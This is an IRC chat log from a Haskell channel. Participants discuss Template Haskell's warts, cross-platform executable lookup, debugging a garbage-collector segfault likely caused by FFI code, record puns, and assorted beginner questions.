20:03:37 <johnw> given how much I loved defmacro in CL, you'd think I would like TH more, but it's not quite the same
20:03:51 <sclv> i think you can do nfdata with default instances and new generics
20:03:51 <tabemann> defmacro is much simpler and cleaner conceptually, though
20:04:09 <johnw> my biggest problem is with how GHC needs to actually load shared libraries at compile time if you like to package that require them
20:04:10 <tabemann> the only hitch with it is that you have to remember to use (gensym)
20:04:49 <johnw> tabemann: there are libraries that make gensym'ing much cleaner, too
20:04:51 <edwardk> johnw: yeah. that has basically rendered template haskell and a bunch of my code completely immiscible
20:05:08 <tabemann> and macros in CL fit much nicer with the rest of the language, whereas TH sticks out like a sore thumb mixed with other Haskell code
20:05:09 <carter> johnw : also ghc-ios can't do template haskell
20:05:16 <carter> at least for the next year
20:05:29 <carter> hopefuly even better multi target cross compiler support is sorted out over teh enxt year
20:05:38 <johnw> i'm looking forward to coding some space leaks for my iPhone
20:05:48 <edwardk> johnw: e.g. i can't include some code that i was working on that used MPFR internals in any project that uses template haskell, because ghci can't link it in and run my garbage collection hooks
20:06:04 <tabemann> okay, need to get off for a bit
20:06:11 <carter> edwardk so it'd maybe work with 7.8?
20:06:15 <edwardk> johnw: and hence template-haskell also fails because of how it works
20:06:22 <carter> maybe
20:06:23 <carter> ?
20:06:24 <edwardk> carter: hopefully. i'd like to get that project off the back burner
20:06:31 <carter> is this the bounded?
20:06:35 <edwardk> rounded
20:06:37 <carter> ok
20:06:39 <carter> yes
20:06:39 <carter> that one
20:06:46 <carter> also the CMM might get prettier!
20:06:51 <johnw> edwardk: yeah, I was bitten heavily on Linux (but not on Mac) when TH needed to load gSOAP libraries which in turn depend on an object file built in my own project!
20:07:00 <edwardk> one of the older versions may be able to be resurrected, but the CMM would almost be a complete rewrite
20:07:08 <mgsloan> tabemann: Personally, I think that TH looks /too/ similar to Haskell code.  Splices and quasi-quotes are both like normal haskell syntax with slightly different spacing...
20:08:06 * johnw notes that mgsloan is a TH fanboi
20:08:28 <johnw> $(hi mgsloan)
20:08:35 <enthropy> whitespace for $( ) vs $ ( ) is about the same as the layout rule
20:08:47 <mgsloan> Yeah, I love it as a tool, but have gotten fed up with its warts
20:08:47 <enthropy> in the same league
20:09:26 <mgsloan> [x| x <- 100 |] vs [x | x <- 100 ] ?
20:09:53 <mgsloan> Sure maybe it's a stretch, but visually there's a lot of resemblance
20:11:08 <mgsloan> (let's pretend that we've got a Num [a] instance for that comprehension ;) )
20:11:17 <shachaf> I'm fed up with its warts and I've never even used it!
20:11:49 <carter> mgsloan have you played with the TH in head?>
20:12:03 <mgsloan> carter: I haven't!  I'm looking forward to it, though
20:12:15 <carter> play with it before its gets released
20:12:19 <carter> please
20:12:21 <carter> someone should
20:12:25 <carter> what if theres a bug!
20:12:34 <mgsloan> Good point!
20:12:40 <mgsloan> I'll see if I can give it some cycles
20:12:53 <carter> yay
20:13:00 <carter> someone has to
20:13:07 <mgsloan> I'm considering proposing the deprecation of naked splices
20:13:15 <carter> i don't know what that means
20:13:29 <carter> explain your words
20:13:33 <mgsloan> TH allows expressions at the top level to be compiletime splices
20:13:40 <carter> yes
20:13:42 <carter> thats a good thing
20:13:46 <mgsloan> Why?
20:14:03 <mgsloan> Err, what I mean is, "naked expressions" at the top level are treated as splices
20:14:15 <mgsloan> even if template haskell is off, GHC will complain about a naked expression at top level
20:14:30 <carter> oh
20:14:31 <carter> well
20:14:39 <carter> well
20:14:41 <mgsloan> So, pretty much any time you mess up indentation and end up with something on col 0, you get that error
20:14:47 <carter> ok
20:14:48 <mgsloan> That's ok - that's not so bad
20:15:03 <mgsloan> The real awful bit is that if TemplateHaskell is on, and you accidentally do that
20:15:04 <carter> what the  thing you're talking about?
20:15:18 <carter> and it splices in an expression at the top level?
20:15:19 <johnw> tabemann: didn't realize your question would turn into the perfect troll, did you?
20:15:31 <mgsloan> Then you end up getting a bunch of scope errors in the top half of your code (above the new "splice")
20:15:37 <carter> ok
20:15:38 <carter> well
20:15:47 <mgsloan> And no indication at all that these scope errors are due to that introduced splice
20:15:56 <carter> mgsloan you understand what the new stuff in TH does, right?
20:16:05 <carter> you get metaHaskell
20:16:09 <mgsloan> I know that it gives you type tags
20:16:14 <carter> thats only on one side
20:16:27 <carter> for normal TH, it relaxes the quasiquoter
20:16:29 <mgsloan> beyond that, I don't recall what the new stuff is
20:16:34 <mgsloan> Ahh, yeah, that's nice
20:16:49 <carter> so you can have TH for conditional compilation based upon a version number in another module
20:17:09 <carter> so you can sanely do conditional compilation based on your local packaged db or whatever
20:17:12 <carter> in setup.hs
20:17:13 <carter> or something
20:17:14 <mgsloan> Reify is getting more powerful then?
20:17:21 <carter> no,
20:17:32 <mgsloan> Ah, so it's just something via runIO?
20:17:37 <carter> nope
20:17:38 <carter> i mean
20:17:40 <carter> currently
20:17:47 <carter> if i quote a haskell expression
20:17:51 <carter> its still checked
20:17:57 <carter> for if its referring to defined things
20:18:01 <carter> even if i don't splice it back in!
20:18:02 <carter> right?
20:18:11 <mgsloan> yup
20:18:47 <carter> new TH, drops the restriction
20:18:54 <carter> @hackage llvm-base
20:18:54 <lambdabot> http://hackage.haskell.org/package/llvm-base
20:19:25 <carter> https://github.com/bos/llvm/blob/master/base/Setup.hs#L116-L129 is what i'd WANT to write
20:19:28 <enthropy> carter, so if there's no x in scope with   [d| f = x |], you'll get: [d| f = $(dyn "x") |] ?
20:19:46 <mgsloan> carter: right, what's that to do with conditional compilation / version numbers?
20:19:49 <carter> https://github.com/bos/llvm/blob/master/base/Setup.hs#L116-L129
20:19:56 <carter> look at the code i'm linking to
20:20:15 <carter> i wanted llvm-base to build with cabal >= 1.17, and still be backwards compatible
20:20:20 <carter> but there was a breaking api change
20:20:40 <carter> and you can't use the CPP tricks for lib versions in a setup.hs
20:20:46 <mgsloan> Ah, interesting!
20:20:47 <carter> because setup.hs creates that CPP info
20:21:16 <carter> so this is actually an argument for having a value in your lib that IS the version number
20:21:23 <carter> so you can have TH instead of CPP :)
20:21:24 <carter> ish
20:21:40 <carter> admittedly, CPP is more portable / cross compiler friendly than TH (at least for now)
20:21:45 <mgsloan> Sure, seems reasonable
20:22:10 <mgsloan> And CPP actually has the potential to be more IDE friendly (even if it's still a bit of a pain there)
20:22:56 <mgsloan> Eh, maybe the splice / ast-quote situation isn't so bad for that
20:23:42 <lukexi> if anyone wants to get some prime mainstream haskell evangelizing in, we're still #1 on hacker news : )) https://news.ycombinator.com
20:25:27 <mgsloan> On the topic of naked expressions, though - I think it's gnarly that any valid expression syntax at top level is parsed as potentially.  The fact that errantly adding a top level expression can cause bizarre scope errors increased my distaste for that
20:26:36 <carter> mgsloan i think a better starting point is asking "can we improve the error messages when this happens"
20:26:53 <carter> mgsloan: SPJ would love someone tohelp improve error messages
20:26:53 <lambdabot> I'm not that famous.
20:27:06 <mgsloan> Hahaha
20:27:06 <carter> SPJ?
20:27:22 <carter> why did lambdabot say that
20:28:08 <mgsloan> I guess you could have some sort of warning like "All of the above error messages might be bogus due to this splice"
20:29:35 <mgsloan> If it could manage to typecheck the splice before attempting to rename / typecheck the code above, then there could instead very helpfully be the feedback that "this splice is bogus"
20:29:54 <carter> mgsloan think like how clang tries to give good error messages
20:30:03 <mgsloan> Oh, I am
20:30:26 <carter> theres so many opportunities for some thought improvement of GHC error messages
20:30:32 <mgsloan> I'd very much like to have GHC / etc at a similar level of friendliness
20:30:38 <mgsloan> certainly
20:31:01 <carter> he's actually out right said "theres at least one really really awesome phd sized project in that task"
20:31:05 <carter> probably more than one
20:32:22 <mgsloan> Hahah, well, helium seemed like a pretty good haskell 98 go at it
20:34:56 <carter> well, point being
20:35:17 <carter> based on the repeated remarks of spj, he'd LOVE someone to "own" working on that
20:37:54 <carter> hint hint
20:38:02 <carter> easy SPJ karma
20:45:10 <Ghoul_> is there a way to check if an executable is present in a folder relative to my program that works on both windows and linux
20:45:28 <Ghoul_> the 'gotcha' being that on windows it has a .exe extension whereas on linux it has no extension
20:45:51 <Fuuzetsu> you could check for both
20:46:09 <Ghoul_> hmm, actually, I could.
20:46:12 <Fuuzetsu> (or use the CPP to determine the OS beforehand)
20:46:24 <Fuuzetsu> I think there's a function for doing this portably somewhere though
20:46:28 <Fuuzetsu> @hoogle path
20:46:29 <lambdabot> Test.HUnit.Base type Path = [Node]
20:46:29 <lambdabot> Data.Graph.Inductive.Graph type Path = [Node]
20:46:29 <lambdabot> Data.Graph path :: Graph -> Vertex -> Vertex -> Bool
20:46:35 <Ghoul_> there is findExecutable
20:46:43 <Ghoul_> but theres a thing that the documentation doesn't talk about
20:46:50 <Ghoul_> so I pushed the commit with it working on windows, and got yelled at on nix
20:47:09 <Ghoul_> (and that thing is that, on linux, it doesn't check relative to the current directory too)
20:47:26 <Ghoul_> so I did something like findExecutable "bin/mytool" and it passed on windows as mytool.exe being there, but failed on nix
20:47:26 <shachaf> That sounds like a reasonable behavior.
20:47:33 <Fuuzetsu> Ghoul_: add the absolute path of the relative directory to PATH, that should work, no?
20:47:46 <Fuuzetsu> THEN look for the executable name
20:47:54 <Ghoul_> Hah, I guess that's a solution
20:48:03 <Ghoul_> but I'd call that more of a hack
20:49:02 <Ghoul_> Checking for both is probably the best way to do this. Thanks all :)
21:08:19 * hackagebot incremental-parser 0.2.3.2 - Generic parser library capable of providing partial results from partial input.  http://hackage.haskell.org/package/incremental-parser-0.2.3.2 (MarioBlazevic)
21:08:21 * hackagebot scc 0.8.2 - Streaming component combinators  http://hackage.haskell.org/package/scc-0.8.2 (MarioBlazevic)
21:10:40 <carter> night all!
21:11:54 <johnw> good night!
21:12:15 <Ghoul_> carter: night
21:21:17 * monochrom is bitten by this little factoid: OverlappingInstances needs to be enabled in the file that provides the instances, not in the file that uses the instances
21:25:31 <Fuuzetsu> Hmm? Is that right?
21:25:37 <Fuuzetsu> Well, I guess it makes sense.
21:31:00 <blackdog> I'm getting a segfault in my GHC-built program that looks like it's nowhere near my code - https://gist.github.com/mwotton/6386324
21:31:15 <blackdog> any hints on interpreting that backtrace? Is there a better way than running it under gdb?
21:31:49 <heatsink> It appears to be in the garbage collector
21:32:01 <tabemann> without seeing your code, it's hard to say anything
21:32:26 <blackdog> tabemann: it's all commercial code unfortunately :/
21:32:28 <tabemann> there are any numbers of things one could do in Haskell that could cause remote crashes, e.g. bad FFI code or horrible abuses of unsafeCoerce
21:33:13 <tabemann> then there's not much we can do to help, just looking at that stack trace
21:33:17 <blackdog> tabemann: so your advice would be to go looking for libraries using FFI code? I haven't used unsafeCoerce myself.
21:33:20 <blackdog> (or FFI.)
21:33:45 <blackdog> tabemann: right - so it likely doesn't indicate a problem in the GC itself, just some corruption in memory?
21:33:46 <tabemann> you can do pointer accesses and arithmetic with FFI code, and Haskell does absolutely nothing to ensure its safety
21:34:47 <heatsink> Some array library code skips bounds checking for performance reasons
21:34:57 <blackdog> heatsink: so i gather what's happening there is there's a bogus memory reference that some FFI code (or equivalent) has managed to bugger up, and it just looks like the GC is at fault because it's the next one to look at it?
21:35:06 <heatsink> yes
21:36:30 <aupiff> hello, does anyone know how I can find the highlighting-kate executable? or generate it? hackage says it's optional, but I am not sure what that means... I installed the package from hackage, but the executable is not in ./cabal/bin
21:38:15 <tabemann> <tabemann> you can do pointer accesses and arithmetic with FFI code, and Haskell does absolutely nothing to ensure its safety
21:38:16 <tabemann> * paddymahoney is now known as Guest48159
21:38:16 <tabemann> <tabemann> I would presume that the GC itself is not broken, as it is probably much more heavily used than whatever code your running on top of it
21:38:16 <tabemann> <tabemann> whereas if you're corrupting memory, you could easily break a pointer somewhere that doesn't followed until the GC comes along
21:38:28 <tabemann> the last thing I saw was <blackdog> tabemann: right - so it likely doesn't indicate a problem in the GC itself, just some corruption in memory?
21:39:19 <blackdog> tabemann:  < blackdog> heatsink: so i gather what's happening there is there's a  bogus memory reference that some FFI code (or equivalent)  has managed to bugger up, and it just looks like the GC is  at fault because it's the next one to look at it?
21:39:32 * tabemann is personally amazed by the sorts of unsafe code one can write in Haskell, when in most other GCed languages one's have to drop down into C to do such unsafe things
21:39:46 <tabemann> blackdog; yeah
21:39:57 <blackdog> tabemann: well, this will be fun. first to work out which library is doing evil stuff...
21:40:16 <heatsink> blackdog: <heatsink> tabemann:  < blackdog> heatsink: Why so may levels of quotes?
21:40:54 <blackdog> heatsink: my puny IRC interpreter can't handle tail-recursive conversations.
21:42:02 <tabemann> blackdog: the problem is that just about anywhere there's FFI code or an unsafeCoerce or even bad C code called by FFI code could be doing it
21:42:15 <tabemann> including in libraries
21:42:30 <tabemann> many of which use both FFI code and unsafeCoerce heavily
21:42:32 <blackdog> tabemann: yeah, that's what i mean. will be "fun" tracking down the guilty code.
21:42:40 <heatsink> Could you narrow down the problem by running the GC more frequently?
21:42:50 <tabemann> heatsink: yeah
21:42:51 <blackdog> it only seems to crop up when i have ~400 threads, too.
21:43:11 <tabemann> if you do a full major GC you could localize it in time to somewhere between then and the previous major GC
21:43:20 * hackagebot citation-resolve 0.3.0.2 - convert document IDs such as DOI, ISBN, arXiv ID to bibliographic reference.  http://hackage.haskell.org/package/citation-resolve-0.3.0.2 (TakayukiMuranushi)
21:44:37 <tabemann> and yes, you can crash with unsafeCoerce - try entering this in GHCi: (unsafeCoerce (putStrLn "evil") :: () -> ()) ()
21:44:47 <JohnTerryCFC649> Hello!
21:44:53 <JohnTerryCFC649> Wanted to share a new programming forum/community: http://thedevshed.net/forum/
21:44:59 <JohnTerryCFC649> Feel free to join :)
21:52:22 <shachaf> JohnTerryCFC649: Please don't spam links in here.
21:52:38 <Fuuzetsu> I wish I found out about RecordPuns earlier…
21:54:24 * shachaf sighs.
21:55:54 <tabemann> RecordPuns reminds me of a similar pattern in OCaml with named function parameters
21:56:26 <tabemann> where if you had a local variable that had the same name as a named function parameter, one could shorten just specify the name alone
21:58:05 <isomorphismes> Can I ask a #yesod question in here? I'm able to import Data.Text in ghci but when I import Data.Text in a file (within Yesod) the compiler doesn't see it.
21:58:42 <heatsink> Is there an error at the import statement?
21:58:55 <shachaf> I think #yesod would be a better place for a Yesod question.
21:59:20 <shachaf> But "doesn't see it" doesn't describe a behavior.
21:59:46 <Fuuzetsu> tabemann: there's also RecordWildCards which also is seems great
22:00:28 <shachaf> Shadowing is a bad idea.
22:00:39 <tabemann> I've been using RecordWildCards, but not RecordPuns
22:01:17 <shachaf> (So those extensions are at the very least suspect.)
22:01:57 <isomorphismes> https://dpaste.de/LKxLn/ That's the error message. I can paste files too. Sorry, I'm not sure exactly how to describe what error messages mean succinctly.
22:02:23 <tabemann> the problem is that record pattern matches otherwise tend to be quite cumbersome, and if one doesn't *need* the shadowed identifiers in one's code...
22:03:24 <Sonarpulse> any way to figure out why documentation hasn't been built in any version of my package? http://hackage.haskell.org/package/henet-1.3.9.2
22:03:32 <shachaf> isomorphismes: It looks like two different things are going on.
22:03:35 <Sonarpulse> don't think i got build errors
22:03:41 <tabemann> and if one tries to reuse the identifiers for their original, shadowed bindings, they'll generally fail explicitly
22:03:56 <shachaf> I'd guess that (a) something else is exporting Text, so you don't *need* the Data.Text import (hence GHC saying that it's redundant)
22:04:17 <shachaf> (b) You don't have OverloadedStrings enabled or something, so a string literal is being treated as String instead of as Text.
22:08:42 * tabemann will have to remember OverloadedStrings
22:10:21 <isomorphismes> shachaf: Where should I type {-# LANGUAGE OverloadedStrings #-} ?
22:10:46 <heatsink> before the beginning of the module
22:15:37 <isomorphismes> heatsink: Thanks. That didn't work though.
22:16:51 <ParaSa1lin> @src IsString
22:16:51 <lambdabot> Source not found. BOB says:  You seem to have forgotten your passwd, enter another!
22:39:34 <isomorphismes> oh. it was a really stupid error. I hadn't updated the config/routes. Sorry all.
22:41:09 <isomorphismes> I think I am used to jumping on an error as soon as I get one. But maybe since everything is cross-checked I need to follow a longer block of instructions before trying to debug.
22:59:39 <Sonarpulse> how are haskell values (say bytestrings) handled off by ptr to C code GC'd?
23:01:24 <mstksg> does anyone know anywhere i can read on use cases of record puns?  the official documentation tries hard to be as generic as possible
23:06:27 <ParaSa1lin> Sonarpulse, i believe bytestrings are malloc'd in C ffi
23:09:17 <Sonarpulse> bytestrings are always malloc'd in C?
23:09:23 <Sonarpulse> ParaSa1lin?
23:12:13 <ParaSa1lin> Sonarpulse, http://hackage.haskell.org/packages/archive/bytestring/0.9.2.1/doc/html/src/Data-ByteString-Internal.html#ByteString
23:15:45 <ParaSa1lin> Sonarpulse, so its not malloc'd by ffi
23:16:36 <Driscoll> noob question, what's the most elegant way to convert an N dimetional array to an N dimentional list
23:16:42 <Sonarpulse> thanks
23:16:57 <Driscoll> i'm writing a big custom function for it but i assume there's something better
23:17:30 <Driscoll> in my trivial example i want to turn an array of chars to an array of strings
23:17:33 <Driscoll> er, a list of strings
23:17:55 <enthropy> by n dimensional list, you mean something like [a] or [[a]] or [[[a]]]?
23:19:42 <Driscoll> i would like a two dimentional array to become [[a]]
23:20:02 <Driscoll> if theres a function that is more general and would work on N dimentions, that would be nice to know as well
23:20:39 <Driscoll> my current approach is a big ugly function with ranges and maps and such
23:20:50 <Driscoll> but i just feel like there must be something in the standard library to do it
23:20:58 <Driscoll> i'm just failing at googling it
23:22:49 <ParaSa1lin> Vector Char -> [[Char]] ?
23:23:40 <Driscoll> i havent played with vectors yet
23:23:56 <jtbandes> I have a list [String] that I would like to turn into IO [a], something like the structure do { x <- aList; (x++).unwords.(map show) <$> (someFunc x) }; however since someFunc returns an IO, this doesn't work... any suggestions?
23:31:59 <ahill-89> What's the type of someFunc in that thing?
23:33:22 <jtbandes> ahill-89: in particular it's String -> IO [Int]
23:33:33 <jtbandes> the unwords.(map show) puts the Ints together
23:35:53 <jtbandes> so (...)<$>(someFunc x) :: IO String
23:36:09 <jtbandes> but aList :: [] String
23:43:28 <BMeph> mapM someFunc x, maybe?
23:53:56 <jtbandes> BMeph: x is not the list, but rather an element of the list
